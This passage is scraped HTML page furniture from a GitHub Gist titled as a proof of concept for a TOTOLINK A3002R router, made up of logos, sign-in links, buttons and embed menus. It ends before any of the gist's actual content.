.133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

    <div class="Header-item f4 mr-0" role="navigation" aria-label="Sign in or sign up">
      <a class="Header-link no-underline mr-3" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="933f93b7bbe8bcb1dd3fc712246fa37af8eaa5a0a6d0075de79b2a2c5cd2a8c4" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17">
        Sign&nbsp;in
</a>        <a class="Header-link d-inline-block no-underline border color-border-default rounded px-2 py-1" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8f7c2ffb57b6b0eb47395c31a3657f80d87208dbaedb239437c3397c06af4781" href="/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17&amp;source=header-gist">
          Sign&nbsp;up
</a>    </div>
</div>



      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-22e9be68-9af4-4e29-ad5d-61efdb395a90" aria-labelledby="tooltip-6b5cd9a5-1e6f-457b-8ad3-8af6a1580007" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-6b5cd9a5-1e6f-457b-8ad3-8af6a1580007" for="icon-button-22e9be68-9af4-4e29-ad5d-61efdb395a90" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    <div id="js-flash-container" class="flash-container" data-turbo-replace>




  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/Code">
    <main id="gist-pjax-container">
      

  <div class="gist-detail-intro gist-banner pb-3">
    <div class="text-center container-lg px-3">
      <p class="lead">
        Instantly share code, notes, and snippets.
      </p>
    </div>
  </div>


<div class="gisthead pagehead pb-0 pt-3 mb-4">
  <div class="px-0">
    
  
<div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
  <div class="flex-auto min-width-0 width-fit mr-3">
    <div class="d-flex">
      <div class="d-none d-md-block">
        <a class="mr-2 flex-shrink-0" data-hovercard-type="user" data-hovercard-url="/users/Swind1er/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Swind1er"><img class="avatar avatar-user" src="https://avatars.githubusercontent.com/u/100978844?s=64&amp;v=4" width="32" height="32" alt="@Swind1er" /></a>
      </div>
      <div class="d-flex flex-column width-full">
        <div class="d-flex flex-row width-full">
          <h1 class="wb-break-word f3 text-normal mb-md-0 mb-1">
            <span class="author"><a data-hovercard-type="user" data-hovercard-url="/users/Swind1er/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Swind1er">Swind1er</a></span><!--
                --><span class="mx-1 color-fg-muted">/</span><!--
                --><strong itemprop="name" class="css-truncate-target mr-1" style="max-width: 410px"><a href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17">TOTOLINK-A3002R-V4-Poc.md</a></strong>
          </h1>
        </div>

        <div class="note m-0">
          Last active
          <relative-time tense="past" datetime="2024-08-04T08:11:27Z" data-view-component="true">August 4, 2024 08:11</relative-time>
        </div>
      </div>
    </div>
  </div>
  <ul class="d-md-flex pagehead-actions float-none mr-2">
  </ul>
  <div class="d-inline-block d-md-none ml-auto">
    <action-menu data-select-variant="none" data-view-component="true" class="flex-self-start ml-auto d-inline-block">
  <focus-group direction="vertical" mnemonics retain>
    <button id="gist_options-button" popovertarget="gist_options-overlay" aria-controls="gist_options-list" aria-haspopup="true" aria-labelledby="tooltip-31000645-1312-42b2-a4b7-5130be99a0ea" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal Button-visual">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</button><tool-tip id="tooltip-31000645-1312-42b2-a4b7-5130be99a0ea" for="gist_options-button" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Show Gist options</tool-tip>


<anchored-position data-target="action-menu.overlay" id="gist_options-overlay" anchor="gist_options-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="gist_options-button" id="gist_options-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="b2cd1bc86363e06ac2268a3308957371f26e09709e5ba37e304a99cf0a0dfb4f" data-ga-click="Gist, download zip, location:gist overview" data-targets="action-list.items" data-item-id="download_from_gist_options" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-bd66c8fd-ac68-431b-9476-ff9625895ce4" href="/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17/archive/810c0d69027eb38f2bb0e3688f3daedf2e8fae4b.zip" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-download">
    <path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"></path><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.06 1.06l-3.25 3.25a.749.749 0 0 1-1.06 0L4.22 6.78a.749.749 0 1 1 1.06-1.06l1.97 1.969Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Download ZIP
</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>  </div>
  <ul class="d-md-flex d-none pagehead-actions float-none">


      <li>
          <a id="gist-star-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist star button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8afef073009d916d6a5e399460b1a286ce92f1b92a66787970656e6f27bc4f04" aria-label="You must be signed in to star a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
      </span>
    <span class="Button-label">Star</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>)</span>
          <span aria-hidden="true" title="0" data-view-component="true" class="Counter">0</span>
      </span>
  </span>
</a><tool-tip id="tooltip-cd7ba0b7-ce51-4607-bc52-787979a0b6a1" for="gist-star-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to star a gist</tool-tip>

      </li>
        <li>
            <a id="gist-fork-button" href="/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist fork button&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="5541a9f06a13ecf376401d0fbfb705ad4fe1a11c4df6e664028d7cda9ee9432b" aria-label="You must be signed in to fork a gist" data-view-component="true" class="btn-with-count Button--secondary Button--small Button">  <span class="Button-content">
      <span class="Button-visual Button-leadingVisual">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>
      </span>
    <span class="Button-label">Fork</span>
      <span class="Button-visual Button-trailingVisual">
          <span class="sr-only">(<span aria-hidden="true" title="1" data-view-component="true" class="Counter">1</span>)</span>
          <span aria-hidden="true" title="1" data-view-component="true" class="Counter">1</span>
      </span>
  </span>
</a><tool-tip id="tooltip-a5e6b8c8-b608-4ae5-abf3-67a41213c006" for="gist-fork-button" popover="manual" data-direction="n" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to fork a gist</tool-tip>

        </li>
  </ul>
</div>

  <ul class="d-flex d-md-none px-3 mb-2 pagehead-actions float-none" >
    <li>
      
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-sized-down" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-button" popovertarget="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-overlay" aria-controls="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-overlay" anchor="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-button" id="action-menu-c378ae42-4435-4f38-a097-acfd2a254eb3-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="4d980859265a9d30b65528750438fa338e5a8f67cb914dc1e8751f894c1e2ddf" id="item-4548a1be-25b6-4c47-b23b-ebb9dc646b65" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="408ea395a6a0a3003f86bf9087550c03dc8a4220b4d93a8b895088045cc8bc49" id="item-a2af1c62-1b0f-4c85-aa0b-7f0bf8422cbf" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/ee095fbfe13f77a5b45b39a5aa82bd17.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="6aad312cf14a8933d56690ad6dbfd9252a26f32e83429b8c770b2928de51703f" id="item-0d93fc85-cb3e-4ce0-888b-576f37aa0a08" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-aef41887-cdb3-4659-835f-28ed6a258192" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-sized-down" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-sized-down" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-9c595b31-f39b-4053-927e-d2f847ac93f1" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-sized-down" />
</div>
      <div class="FormControl-inlineValidation" id="validation-9c595b31-f39b-4053-927e-d2f847ac93f1" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-sized-down" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129867668,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0ee5c7ff0ecd6ac8a7f7fcbe5b79baa0700bf929a91f614fbfecad9ad68124b8" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

